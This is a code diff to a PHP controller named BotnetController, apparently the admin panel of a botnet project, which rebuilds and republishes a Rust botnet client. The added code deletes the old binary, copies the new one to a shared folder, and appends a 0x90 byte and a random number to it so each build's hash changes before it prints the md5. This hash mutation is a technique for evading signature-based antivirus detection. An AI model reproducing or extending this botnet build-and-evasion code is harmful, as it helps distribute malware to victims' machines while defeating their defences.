@@ -98,7 +98,7 @@ class BotnetController extends Controller
         if ($return !== 0) {
             return redirect('/home')->with('error', 'Git pull command failed.');
         }
-        $result = array_merge($result, ['Success','Client mis a jour avec le repo git']);
+        $result = array_merge($result, ['Client mis a jour avec le repo git']);
 
 
 
@@ -108,7 +108,7 @@ class BotnetController extends Controller
         if ($return !== 0) {
             return redirect('/home')->with('error', 'Cargo build command failed.');
         }
-        $result = array_merge($result, ['Success','Client compilé avec cargo build --release']);
+        $result = array_merge($result, ['Client compilé avec cargo build --release']);
 
 
         if (!is_dir(storage_path('BOTNET-SHARE'))) {
@@ -119,10 +119,42 @@ class BotnetController extends Controller
         $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');
 
 
+
+        $command = "rm ".$storagePath;
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Git pull command failed.');
+        }
+        $result = array_merge($result, ['Old client removed']);
+
+
         if (!copy($compiledFilePath, $storagePath)) {
             return redirect('/home')->with('error', 'Failed to copy compiled file to storage.');
         }
-        $result = array_merge($result,['Success','API access mis a jour']);
+        $result = array_merge($result,['API access mis a jour']);
+
+
+        $fileHandle = fopen($storagePath, 'a');
+        if ($fileHandle === false) {
+            return redirect('/home')->with('error', 'Failed to open copied file for appending.');
+        }
+
+        if (fwrite($fileHandle, "\x90".rand(1,10000)) === false) {
+            fclose($fileHandle);
+            return redirect('/home')->with('error', 'Failed to append byte to copied file.');
+        }
+        $result = array_merge($result,['Checksum modifié']);
+
+
+        $command = "md5sum ".$storagePath;
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'ERROR CHECK MD5');
+        }
+        $result = array_merge($result, ['Checksum  : '.$output[1]]);
+
+        fclose($fileHandle);
+
 
 
         // Retourne avec les résultats
